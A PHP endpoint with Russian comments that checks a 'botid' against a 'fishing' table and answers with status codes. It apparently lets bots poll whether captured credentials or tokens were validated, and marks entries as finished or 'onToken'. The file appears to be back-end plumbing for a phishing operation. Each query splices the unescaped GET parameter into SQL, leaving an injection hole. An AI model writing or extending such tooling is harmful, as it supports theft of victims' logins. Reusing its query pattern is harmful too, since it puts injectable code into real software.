<?php
require_once('config.php');

// Проверяем, если botid не пустой в GET-запросе
if (!empty($_GET['botid'])) {
    $botid = $_GET['botid'];

    // Формируем SQL-запрос для поиска строки с botid в таблице
    $sql = "SELECT valid FROM fishing WHERE botid = '$botid' ORDER BY id DESC LIMIT 1";

    $result = mysqli_query($link, $sql);

    // Проверяем успешность выполнения запроса
    if ($result) {
        // Проверяем, есть ли найденная строка
        if (mysqli_num_rows($result) > 0) {
            // Если строка найдена, получаем значение столбца "valid"
            $row = mysqli_fetch_assoc($result);
            $valid = $row["valid"];

            // Отправляем соответствующий HTTP-код в ответе
            if ($valid == "true") {
                http_response_code(201);
                updateValidColumn($botid);
                updateFinishColumn($botid);
            } elseif ($valid == "false") {
                http_response_code(202);
                updateValidColumn($botid);
            }

        
        } else {
            // Если строка не найдена, отправляем код 228
            http_response_code(228);
        }

        

    } else {
        // Если произошла ошибка при выполнении запроса, отправляем код 500
        http_response_code(500);
    }

    // Освобождаем память от результата запроса
    mysqli_free_result($result);
} else {
    // Если botid пустой в POST-запросе, отправляем код 400
    http_response_code(400);
}

// Закрываем соединение с базой данных
mysqli_close($link);

function updateValidColumn($botid) {
    global $link;
$update_sql = "UPDATE fishing SET valid = 'null' WHERE botid = '$botid'";
mysqli_query($link, $update_sql);
}

function updateFinishColumn($botid) {
    global $link;
$update_sql = "UPDATE fishing SET finish = 1 WHERE botid = '$botid'";
mysqli_query($link, $update_sql);
}

function updateValidColumnToken($botid) {
    global $link;
$update_sql = "UPDATE fishing SET valid = 'onToken' WHERE botid = '$botid'";
mysqli_query($link, $update_sql);
}
?>
